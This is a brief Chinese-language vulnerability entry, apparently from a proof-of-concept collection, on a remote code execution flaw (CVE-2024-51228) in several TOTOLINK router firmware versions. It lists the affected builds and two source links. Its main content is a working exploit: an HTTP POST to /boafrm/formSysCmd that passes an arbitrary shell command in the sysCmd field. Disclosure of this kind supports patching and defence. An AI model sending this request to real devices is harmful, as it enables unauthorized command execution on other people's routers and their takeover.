# TOTOLINK远程代码执行漏洞(CVE-2024-51228)

TOTOLINK远程代码执行漏洞(CVE-2024-51228)

## 影响版本

- TOTOLINK-CX-A3002RU-V1.0.4-B20171106.1512
- TOTOLINK-CX-N150RT-V2.1.6-B20171121.1002
- TOTOLINK-CX-N300RT-V2.1.6-B20170724.1420
- TOTOLINK-CX-N300RT-V2.1.8-B20171113.1408
- TOTOLINK-CX-N300RT-V2.1.8-B20191010.1107
- TOTOLINK-CX-N302RE-V2.0.2-B20170511.1523

## poc

```
POST /boafrm/formSysCmd HTTP/1.1
Host: {Target IP}:{Target Port}
User-Agent: curl/7.81.0
Accept: */*
Content-Length: <length>
Content-Type: application/x-www-form-urlencoded

sysCmd={shell_cmd}
```



## 漏洞来源

- https://github.com/yckuo-sdc/totolink-boa-api-vulnerabilities
- https://xz.aliyun.com/t/16707